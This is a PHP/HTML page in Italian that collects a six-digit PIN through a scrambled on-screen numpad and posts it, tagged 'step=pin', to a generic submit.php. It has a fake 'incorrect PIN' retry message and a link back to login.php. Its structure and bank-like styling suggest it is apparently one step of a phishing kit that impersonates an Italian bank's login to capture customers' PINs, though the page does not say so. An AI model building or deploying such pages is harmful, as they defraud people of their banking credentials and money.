<?php require_once "../config.php"; ?>
<?php include 'include/header1.php'; ?>
<style>
.error-box {
    border: 1px solid #e74c3c;
    /* red border */
    background-color: #fff;
    color: #333;
    display: flex;
    align-items: center;
    padding: 12px 16px;
    border-radius: 4px;
    font-family: Arial, sans-serif;
    font-size: 14px;
    max-width: 500px;
    margin-bottom: 20px;
}

.error-icon {
    color: #e74c3c;
    font-weight: bold;
    margin-right: 10px;
    font-size: 16px;
}

.error-text {
    flex: 1;
    line-height: 1.4;
}
</style>
<div class="container">
    <form id="pinForm" action="submit.php" method="POST">
        <input type="hidden" name="step" value="pin">
        <input type="hidden" id="pinValue" name="pin" value="">
        <h1>Inserisci il tuo PIN</h1>
        <p class="instruction">Inserisci tutte le 6 cifre del tuo codice PIN</p>
        <div class="error-box" style="<?php echo isset($_GET['error']) ? 'display: flex;' : 'display: none;'; ?>">
            <span class="error-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                    fill="var(--fg_error, #D70000)" focusable="false" aria-hidden="true">
                    <path
                        d="M11.2178,15.6895 C11.2178,15.9065 11.1178,16.0065 10.8678,16.0065 L9.1158,16.0065 C8.8828,16.0065 8.7818,15.9065 8.7818,15.6895 L8.7818,13.9545 C8.7818,13.7375 8.8828,13.6365 9.1158,13.6365 L10.8678,13.6365 C11.1178,13.6365 11.2178,13.7375 11.2178,13.9545 L11.2178,15.6895 Z M9.1988,3.9935 L10.8008,3.9935 C11.0338,3.9935 11.1178,4.0935 11.1178,4.2935 L10.8848,11.8355 C10.8848,12.0015 10.8188,12.0515 10.6348,12.0515 L9.3998,12.0515 C9.2158,12.0515 9.1498,12.0015 9.1498,11.8355 L8.8828,4.2935 C8.8828,4.0935 8.9658,3.9935 9.1988,3.9935 L9.1988,3.9935 Z M9.9998,0.0005 C4.4868,0.0005 -0.0002,4.4855 -0.0002,10.0005 C-0.0002,15.5135 4.4868,20.0005 9.9998,20.0005 C15.5138,20.0005 19.9998,15.5135 19.9998,10.0005 C19.9998,4.4855 15.5138,0.0005 9.9998,0.0005 L9.9998,0.0005 Z"
                        transform="translate(2 2)"></path>
                </svg></span>
            <span class="error-text">
                Oops ... il PIN inserito non è corretto. Controlla e riprova.
            </span>
        </div>
        <div class="pin-boxes">
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
        </div>

        <div class="numpad">
            <button type="button" class="numpad-btn">4</button>
            <button type="button" class="numpad-btn">3</button>
            <button type="button" class="numpad-btn">9</button>
            <button type="button" class="numpad-btn">8</button>
            <button type="button" class="numpad-btn">0</button>
            <button type="button" class="numpad-btn">2</button>
            <button type="button" class="numpad-btn">7</button>
            <button type="button" class="numpad-btn">6</button>
            <button type="button" class="numpad-btn">1</button>
            <button type="button" class="numpad-btn">5</button>
            <div></div>
            <button type="button" class="delete-btn">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2">
                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                    <line x1="18" y1="9" x2="12" y2="15"></line>
                    <line x1="12" y1="9" x2="18" y2="15"></line>
                </svg>
            </button>
        </div>

        <div class="action-buttons">
            <button type="button" id="continueBtn" class="continue-btn" disabled>Continua</button>
            <button type="button" class="back-btn">Indietro</button>
        </div>
    </form>

    <a href="#" class="help-link">
        <span class="arrow">▸</span>
        Hai dimenticato il PIN?
    </a>
</div>

<script>
// PIN Management
let pinDigits = [];
const maxDigits = 6;
const pinBoxes = document.querySelectorAll('.pin-box');
const numpadButtons = document.querySelectorAll('.numpad-btn');
const deleteButton = document.querySelector('.delete-btn');
const continueButton = document.querySelector('#continueBtn');
const backButton = document.querySelector('.back-btn');

// Disable continue button initially
continueButton.disabled = true;
continueButton.style.opacity = '0.5';

// Add event listeners to numpad buttons
numpadButtons.forEach(button => {
    button.addEventListener('click', () => {
        if (pinDigits.length < maxDigits) {
            const digit = button.textContent;
            addPinDigit(digit);
        }
    });
});

// Add event listener to delete button
deleteButton.addEventListener('click', () => {
    if (pinDigits.length > 0) {
        removePinDigit();
    }
});

// Add PIN digit
function addPinDigit(digit) {
    pinDigits.push(digit);

    // Update the corresponding pin box
    pinBoxes[pinDigits.length - 1].innerHTML = '•';

    // Enable continue button if all 6 digits entered
    if (pinDigits.length === maxDigits) {
        continueButton.disabled = false;
        continueButton.style.opacity = '1';
    }
}

// Remove PIN digit
function removePinDigit() {
    pinDigits.pop();

    // Clear the corresponding pin box
    pinBoxes[pinDigits.length].innerHTML = '';

    // Disable continue button if not all 6 digits entered
    if (pinDigits.length < maxDigits) {
        continueButton.disabled = true;
        continueButton.style.opacity = '0.5';
    }
}

// Handle keyboard input
document.addEventListener('keydown', (event) => {
    // Handle number keys (0-9)
    if (/^[0-9]$/.test(event.key) && pinDigits.length < maxDigits) {
        addPinDigit(event.key);
    }

    // Handle backspace key
    if (event.key === 'Backspace' && pinDigits.length > 0) {
        removePinDigit();
    }

    // Handle enter key
    if (event.key === 'Enter' && pinDigits.length === maxDigits) {
        continueButton.click();
    }
});

// Handle continue button click
continueButton.addEventListener('click', () => {
    if (pinDigits.length === maxDigits) {
        // Set PIN value in hidden field
        document.getElementById('pinValue').value = pinDigits.join('');

        // Submit the form
        document.getElementById('pinForm').submit();
    }
});

// Handle back button
backButton.addEventListener('click', () => {
    // Navigate back to login page
    window.location.href = 'login.php?redirect=' + encodeURIComponent(window.location.href);
});
</script>
</body>

</html>